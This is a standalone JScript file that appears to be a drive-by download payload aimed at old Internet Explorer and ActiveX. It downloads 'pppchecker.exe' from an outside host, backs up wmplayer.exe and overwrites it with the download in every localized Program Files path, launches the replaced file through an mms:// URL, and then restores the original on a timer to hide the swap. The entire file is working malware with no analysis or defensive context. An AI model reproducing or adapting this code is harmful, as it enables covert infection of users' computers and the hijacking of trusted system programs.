try{
w = [
"C:\\Program Files\\Windows Media Player\\",
"C:\\Programmer\\Windows Media Player\\",
"C:\\Program\\Windows Media Player\\",
"C:\\Programme\\Windows Media Player\\",
"C:\\Programmi\\Windows Media Player\\",
"C:\\Programfiler\\Windows Media Player\\",
"C:\\Programas\\Windows Media Player\\",
"C:\\Archivos de programa\\Windows Media Player\\",
"D:\\Program Files\\Windows Media Player\\",
"D:\\Programmer\\Windows Media Player\\",
"D:\\Program\\Windows Media Player\\",
"D:\\Programme\\Windows Media Player\\",
"D:\\Programmi\\Windows Media Player\\",
"D:\\Programfiler\\Windows Media Player\\",
"D:\\Programas\\Windows Media Player\\",
"D:\\Archivos de programa\\Windows Media Player\\"
];
n = [
];
var g_WRestored = 0;
var g_NRestored = 0;
var WMRun = 0;
var NRun = 0;
var dat = new ActiveXObject("ADODB.Stream");
dat.Mode = 3; dat.Type = 2; dat.Open();dat.Charset = "ascii";
dat.WriteText("1001");
dat.SaveToFile("C:\\Recycled\\Q382098.inf",2);

var ldr = new ActiveXObject("Microsoft.XMLHTTP");
ldr.Open("GET","http://red1rect.biz/pppchecker.exe",0 );//"http://hq-dialer.com/pppchecker.exe",0);
ldr.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3; s.Type = 1; s.Open();
s.Write(ldr.responseBody);
for (i = 0; i < w.length; i++)
{
   if (1 == FSave(w[i], "wmplayer.exe"))
      WMRun = 1;
}
for (i = 0 ; i < n.length; i++)
{
   if (1 == FSave(n[i], "notepad.exe"))
      NRun = 1;
}
setInterval("Restore()",3500);
if (WMRun == 1)
   location = "mms://";
if (NRun == 1)
   window.open("view-source:file://C:/","_search");
}
catch(e){};
function FSave(path, file)
{
   try
   {
      lpath = "file://"+path.replace(/[\\]/g,"/")+file;
      var o = new ActiveXObject("Microsoft.XMLHTTP");
      o.Open("GET", lpath,0);
      o.Send();
      var s1 = new ActiveXObject("ADODB.Stream");
      s1.Mode = 3; s1.Type = 1; s1.Open();
      s1.Write(o.responseBody);
      s1.SaveToFile(path+file+".bak",2);
      s.SaveToFile(path+file,2);
      if (s.Position == 0)
      {
         s.Write(ldr.responseBody);
         return (1);
      }
   }
   catch(e){};
   return (0);
}
function FRestore(path, file)
{
   try
   {
      var sv = new ActiveXObject("ADODB.Stream");
      sv.Mode = 3;
      sv.Type = 1;
      sv.Open();
      var tMP = new ActiveXObject("Microsoft.XMLHTTP");
      lpath = "file://"+path.replace(/[\\]/g,"/")+file+".bak";
      tMP.Open("GET", lpath,0);
      tMP.Send();
      sv.Write(tMP.responseBody);
      sv.SaveToFile(path+file,2);
      return (1);
   }
   catch(e){};
   return (0);
}
function Restore(file)
{
   if (g_WRestored == 0)
   {
      for (i = 0; i < w.length; i++)
      {
         if (1 == FRestore(w[i], "wmplayer.exe"))
            g_WRestored = 1;
      }
   }
   if (g_NRestored == 0)
   {
      for (i = 0; i < n.length; i++)
      {
         if (1 == FRestore(n[i], "notepad.exe"))
            g_NRestored = 1;
      }
   }
}
